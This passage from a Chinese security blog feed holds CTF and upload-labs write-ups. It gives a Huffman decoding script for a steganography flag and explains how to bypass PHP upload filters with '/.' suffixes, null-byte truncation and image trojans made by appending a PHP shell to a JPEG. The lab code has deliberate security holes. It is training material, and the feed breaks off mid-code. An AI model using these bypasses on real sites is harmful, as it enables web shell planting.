1:</span><br><span class="line">        queue.sort(key&#x3D;lambda item:item.freq) #reverse &#x3D; false</span><br><span class="line">        node_left &#x3D; queue.pop(0)</span><br><span class="line">        node_right &#x3D; queue.pop(0)</span><br><span class="line"></span><br><span class="line">        node_father &#x3D; Node(node_left.freq + node_right.freq)</span><br><span class="line"></span><br><span class="line">        node_father.left &#x3D; node_left</span><br><span class="line">        node_father.right &#x3D; node_right</span><br><span class="line">        node_left.father &#x3D; node_father</span><br><span class="line">        node_right.father &#x3D; node_father</span><br><span class="line">        queue.append(node_father)</span><br><span class="line">    queue[0].father &#x3D; None</span><br><span class="line">    return queue[0]</span><br><span class="line">#Huffman编码</span><br><span class="line">def huffmanEncoding(nodes,root):</span><br><span class="line">    codes &#x3D; [&#39;&#39;] * len(nodes)</span><br><span class="line">    for i in range(len(nodes)):</span><br><span class="line">        node_tmp &#x3D; nodes[i]</span><br><span class="line">        while node_tmp !&#x3D; root:</span><br><span class="line">            if node_tmp.isLeft():</span><br><span class="line">                codes[i] &#x3D; &#39;0&#39; + codes[i]</span><br><span class="line">            else:</span><br><span class="line">                codes[i] &#x3D; &#39;1&#39; + codes[i]</span><br><span class="line">            node_tmp &#x3D; node_tmp.father</span><br><span class="line">    return codes</span><br><span class="line">def freq_count(strr):</span><br><span class="line">    chars &#x3D; []</span><br><span class="line">    chars_fre &#x3D; []</span><br><span class="line"></span><br><span class="line">    for i in range(len(strr)):</span><br><span class="line">        if strr[i] in chars:</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            chars.append(strr[i])</span><br><span class="line">            char_fre &#x3D; (strr[i], strr.count(strr[i]))</span><br><span class="line">            # print(chars_fre)</span><br><span class="line">            chars_fre.append(char_fre)</span><br><span class="line">    return chars_fre</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encoder_huffman(strr,chars_fre,codes):</span><br><span class="line">    huffmans&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">    for word in strr:</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        #用于与code【i】还有item 的符号一一对应</span><br><span class="line">        for item in chars_fre:</span><br><span class="line">            if word &#x3D;&#x3D; item[0]:</span><br><span class="line">                huffmans +&#x3D; codes[i]</span><br><span class="line">            i +&#x3D; 1</span><br><span class="line">    print(huffmans)</span><br><span class="line">    return huffmans</span><br><span class="line"></span><br><span class="line">def decode_huffman(huffmans,codes,chars_fre):</span><br><span class="line">    original_code&#x3D;&#39;&#39;</span><br><span class="line">    while huffmans!&#x3D;&#39;&#39;:</span><br><span class="line">        i&#x3D;0</span><br><span class="line">        for item in codes:</span><br><span class="line">            if item in huffmans:</span><br><span class="line">                if huffmans.index(item) &#x3D;&#x3D;0:</span><br><span class="line">                    original_code +&#x3D; chars_fre[i][0]</span><br><span class="line">                    huffmans&#x3D;huffmans[len(item):]</span><br><span class="line">            i+&#x3D;1</span><br><span class="line">    return original_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #chars &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;]</span><br><span class="line">    #freqs &#x3D; [10,4,2,5,3,4,2,6,4,4,3,7,9,6]</span><br><span class="line"></span><br><span class="line">    #元组的列表，item【1】就是后面2，2，3，4，等，生成器然后是作为列表保存，传入createnodes中</span><br><span class="line">   # &#39;&#39;&#39;&#39;&#39;&#39;chars_freqs &#x3D; [(&#39;C&#39;, 2), (&#39;G&#39;, 2), (&#39;E&#39;, 3), (&#39;K&#39;, 3), (&#39;B&#39;, 4),</span><br><span class="line">   #                 (&#39;F&#39;, 4), (&#39;I&#39;, 4), (&#39;J&#39;, 4), (&#39;D&#39;, 5), (&#39;H&#39;, 6),</span><br><span class="line">   #                 (&#39;N&#39;, 6), (&#39;L&#39;, 7), (&#39;M&#39;, 9), (&#39;A&#39;, 10)]</span><br><span class="line">   # &#39;&#39;&#39;&#39;&#39;&#39;</span><br><span class="line">if __name__ &#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    #sttttt &#x3D;input(&#39;input your text&#39;)</span><br><span class="line">    #sttttt&#x3D;input(&#39;input your text&#39;)</span><br><span class="line">    sttttt&#x3D;&quot;&quot;</span><br><span class="line">    sttttt &#x3D; open(&#39;docx复制粘贴出来的文本&#39;,&#39;r&#39;).read()</span><br><span class="line">    # for i in range(100):</span><br><span class="line">    #     sttttt +&#x3D; str(int(random.randint(27, 70)))</span><br><span class="line">    #     sttttt +&#x3D; random.choice(&#39;abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()&#39;)</span><br><span class="line">    # sttttt&#x3D;random.sample(</span><br><span class="line">    #     [&#39;z&#39;, &#39;y&#39;, &#39;x&#39;, &#39;w&#39;, &#39;v&#39;, &#39;u&#39;, &#39;t&#39;, &#39;s&#39;, &#39;r&#39;, &#39;q&#39;, &#39;p&#39;, &#39;o&#39;, &#39;n&#39;, &#39;m&#39;, &#39;l&#39;, &#39;k&#39;, &#39;j&#39;, &#39;i&#39;, &#39;h&#39;, &#39;g&#39;, &#39;f&#39;, &#39;e&#39;,</span><br><span class="line">    #      &#39;d&#39;, &#39;c&#39;, &#39;b&#39;, &#39;a&#39;],20)</span><br><span class="line">   # print(sttttt)</span><br><span class="line">    # print(&#39;编译前输入的文本：    &#39;+sttttt)</span><br><span class="line">    #chars_freqs&#x3D;freq_count(sttttt)</span><br><span class="line"></span><br><span class="line">    #c&#x3D;input(&#39;input your word and freq, splitted with ,&#39;)</span><br><span class="line">    #splitt &#x3D; c.split(&#39;,&#39;)</span><br><span class="line">    #print(splitt)</span><br><span class="line">    chars_freqs &#x3D;[]</span><br><span class="line">    chars_freqs &#x3D; freq_count(sttttt)</span><br><span class="line">    print(&#39;文本中字符的统计如下：\n&#39;+str(chars_freqs))</span><br><span class="line">    # for i in range(0,len(sttttt),2):</span><br><span class="line">    #     chars_freq&#x3D;   (sttttt[i], sttttt[i+1])</span><br><span class="line">    #     if sttttt[i] in [item[0] for item in chars_freqs]:</span><br><span class="line">    #         print(&#39;can not be  a huffman code, there is some word repeating in this sentence, the huffman code will be without:&#39;,sttttt[i],sttttt[i+1])</span><br><span class="line">    #         continue</span><br><span class="line">    #     chars_freqs.append(chars_freq)</span><br><span class="line">    # print(chars_freqs)</span><br><span class="line">    nodes &#x3D; createNodes([item[1] for item in chars_freqs])</span><br><span class="line">    #print([item[1] for item in chars_freqs])</span><br><span class="line">    root &#x3D; createHuffmanTree(nodes)</span><br><span class="line">    codes &#x3D; huffmanEncoding(nodes,root)</span><br><span class="line">    res &#x3D; &#123;&#125;</span><br><span class="line">    for item in zip(chars_freqs,codes):</span><br><span class="line">        print (&#39;Character:%s freq:%-2d   encoding: %s&#39; % (item[0][0],item[0][1],item[1]))</span><br><span class="line">        res.update(&#123;item[1]:item[0][0]&#125;)</span><br><span class="line">    # huffman_code&#x3D;encoder_huffman(sttttt,chars_freqs,codes)</span><br><span class="line">    # print(&#39;转换之后的huffman编码  &#39;+huffman_code)</span><br><span class="line">    # print(&#39;解码之后的原来的文本：  &#39;+decode_huffman(huffman_code,codes,chars_freqs))</span><br><span class="line">    print(res)</span><br><span class="line">    d2 &#x3D; open(&#39;你outguess提取出来的编码&#39;,&#39;r&#39;).readlines()</span><br><span class="line">    re &#x3D; &#39;&#39;</span><br><span class="line">    for i in d2:</span><br><span class="line">        re+&#x3D;res[i[:-1]]</span><br><span class="line">    #     re +&#x3D; res[i]</span><br><span class="line">    print(re)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就可以得到flag了。</p><p>参考<a href="http://www.fzwjscj.xyz/index.php/archives/41/">http://www.fzwjscj.xyz/index.php/archives/41/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h3&gt;&lt;p&gt;异世相遇！尽享美味！安恒赛高！&lt;/p&gt;
&lt;p&gt;喊了也不给，还得取关它&lt;/p&gt;
&lt;h3 id=&quot;简单的png隐写&quot;&gt;&lt;a href=&quot;#简单的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>upload-2</title>
    <link href="http://example.com/2021/03/24/upload-3/"/>
    <id>http://example.com/2021/03/24/upload-3/</id>
    <published>2021-03-24T14:59:08.000Z</published>
    <updated>2021-03-25T14:52:16.164Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19 /.绕过"></a>Pass-19 /.绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是要利用这个黑名单来完成绕过了。查了其他的writeup后，发现move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的/.。而代码中的file_name是用户可控的，这就给了我们可以利用的地方，上传一个图片马，将保存名字改为upload-19.php/.。</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5s2gmieZ0un5vQHgehzviZ2kTyCKXoFJaNjsAegkpBWTbhzSMcKyYzHA3yYVIVVx2VvaP*PORznFJIQ9hOJDNB8!/mnull&bo=1gEcAAAAAAADB.k!&rf=photolist&t=5" alt="img"></p><p>访问地址</p><h3 id="Upload-labs-Pass-20-数组-绕过"><a href="#Upload-labs-Pass-20-数组-绕过" class="headerlink" title="Upload-labs Pass-20 数组+/.绕过"></a>Upload-labs Pass-20 数组+/.绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>20关和上面一样</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Pass-19-绕过&quot;&gt;&lt;a href=&quot;#Pass-19-绕过&quot; class=&quot;headerlink&quot; title=&quot;Pass-19 /.绕过&quot;&gt;&lt;/a&gt;Pass-19 /.绕过&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>upload-2</title>
    <link href="http://example.com/2021/03/24/upload-2/"/>
    <id>http://example.com/2021/03/24/upload-2/</id>
    <published>2021-03-24T14:59:08.000Z</published>
    <updated>2021-03-25T09:22:12.532Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 %00截断"></a>Pass-11 %00截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接传<code>php</code>得到提示，又是白名单了</p><p>改文件后缀名和<code>URL</code>中的路径,url中，可以直接采用%00截断</p><h3 id="Pass-12-0x00截断"><a href="#Pass-12-0x00截断" class="headerlink" title="Pass-12 0x00截断"></a>Pass-12 0x00截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;<span class="comment">//换成了POST</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题和上一题基本一样，只是save_path不在URL中了，而在POST数据里面，由于POST里面的数据不会被url自动解码</p><p><img src="https://img-blog.csdnimg.cn/2019110411345913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9iYXluay5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>我的不知道为什么是乱的，用下别人的</p><p>2b改为00就可以了</p><h3 id="Pass-13-图片马绕过-unpack"><a href="#Pass-13-图片马绕过-unpack" class="headerlink" title="Pass-13 图片马绕过-unpack"></a>Pass-13 图片马绕过-unpack</h3><p>图片马可以用以下命令直接在CMD中制作，copy 2.jpg/b + shell.php/a shell.jpg</p><p>其他gif,png也是一样的</p><p>shell命令为：<?php echo "It's OK!"; ?>只要上传成功后，被作者提供的包含漏洞包含后能够输出OK即可。</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcasJTVqUNQC70QhblhyONKRWuKFtn0ZB8DXlxXA9QfAH1r2eSC5Q0CNzdcsqx2Y*hEL.oYz674CoY2lCEY.ZQ.M!/b&bo=vwJ3AQAAAAADF*k!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcasJTVqUNQC70QhblhyONKQTCsqyUoa03*kQEzYLHH88hcXYGMJv2SQA1A0mq5aF4kzzhYzoCWLi3m8Fwe3wcW8!/b&bo=bAZFAgAAAAADFx8!&rf=viewer_4" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">//以二进制数据形式进行读取</span></span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    <span class="comment">//将2字节拆成两个字符，用数组的形式的体现出来</span></span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    <span class="comment">//将字符转成整数并且进行拼接</span></span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span 